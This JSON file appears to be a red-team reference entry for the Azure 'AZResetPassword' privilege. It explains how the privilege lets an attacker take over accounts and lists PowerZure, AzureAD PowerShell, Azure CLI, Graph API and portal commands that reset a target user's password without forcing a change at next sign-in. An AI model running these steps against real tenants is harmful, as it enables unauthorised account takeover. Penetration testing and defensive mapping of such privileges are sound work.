{
    "AZResetPassword": {
        "meaning": "The ability to change another user's password without knowing their current password. This privilege allows an attacker to gain access to target user accounts by resetting their passwords. If password write-back is enabled, this password will also be set for a synced on-premises user.",
        "common": "",
        "windows": {
            "PowerZure": [
                {
                    "order": 1,
                    "command": "Set-AzureUserPassword -User target@domain.com -Password \"NewP@ssw0rd123!\"",
                    "description": "Reset target user password using PowerZure"
                },
                {
                    "order": 2,
                    "command": "Get-AzureUser -User target@domain.com",
                    "description": "Verify target user information after password reset"
                }
            ],
            "Azure_Portal": [
                {
                    "order": 1,
                    "command": "# Navigate to Azure Portal -> Azure Active Directory -> Users",
                    "description": "Access user management in Azure portal"
                },
                {
                    "order": 2,
                    "command": "# Find target user in list and click on user",
                    "description": "Locate and select the target user account"
                },
                {
                    "order": 3,
                    "command": "# Click 'Reset Password' button",
                    "description": "Initiate password reset process through Azure portal"
                },
                {
                    "order": 4,
                    "command": "# Set new password and configure reset options",
                    "description": "Configure new password and force change settings"
                }
            ],
            "PowerShell_AzureAD": [
                {
                    "order": 1,
                    "command": "Connect-AzureAD -Credential $Creds",
                    "description": "Connect to Azure AD with privileged credentials"
                },
                {
                    "order": 2,
                    "command": "$NewPassword = ConvertTo-SecureString \"NewP@ssw0rd123!\" -AsPlainText -Force",
                    "description": "Create secure string for new password"
                },
                {
                    "order": 3,
                    "command": "Set-AzureADUserPassword -ObjectId TARGET_USER_ID -Password $NewPassword -ForceChangePasswordNextLogin $false",
                    "description": "Reset target user password using AzureAD PowerShell"
                }
            ]
        },
        "linux": {
            "Azure_CLI": [
                {
                    "order": 1,
                    "command": "az login --username admin@domain.com --password password",
                    "description": "Authenticate to Azure using privileged account"
                },
                {
                    "order": 2,
                    "command": "az ad user update --id target@domain.com --password \"NewP@ssw0rd123!\" --force-change-password-next-sign-in false",
                    "description": "Reset target user password using Azure CLI"
                },
                {
                    "order": 3,
                    "command": "az ad user show --id target@domain.com --query '{displayName:displayName, userPrincipalName:userPrincipalName}'",
                    "description": "Verify target user information after password reset"
                }
            ],
            "Microsoft_Graph_API": [
                {
                    "order": 1,
                    "command": "curl -X PATCH 'https://graph.microsoft.com/v1.0/users/{target-user-id}' -H 'Authorization: Bearer $ACCESS_TOKEN' -H 'Content-Type: application/json' -d '{\"passwordProfile\": {\"password\": \"NewP@ssw0rd123!\", \"forceChangePasswordNextSignIn\": false}}'",
                    "description": "Reset user password using Microsoft Graph API"
                },
                {
                    "order": 2,
                    "command": "curl -X GET 'https://graph.microsoft.com/v1.0/users/{target-user-id}' -H 'Authorization: Bearer $ACCESS_TOKEN'",
                    "description": "Verify target user information after password change"
                }
            ],
            "PowerShell_Core": [
                {
                    "order": 1,
                    "command": "pwsh -c \"Connect-AzureAD -AccountId admin@domain.com\"",
                    "description": "Connect to Azure AD using PowerShell Core on Linux"
                },
                {
                    "order": 2,
                    "command": "pwsh -c \"Set-AzureADUserPassword -ObjectId TARGET_USER_ID -Password (ConvertTo-SecureString 'NewP@ssw0rd123!' -AsPlainText -Force) -ForceChangePasswordNextLogin \\$false\"",
                    "description": "Reset target user password using PowerShell Core"
                },
                {
                    "order": 3,
                    "command": "pwsh -c \"Get-AzureADUser -ObjectId TARGET_USER_ID | Select DisplayName, UserPrincipalName\"",
                    "description": "Verify target user details after password reset"
                }
            ]
        }
    }
}
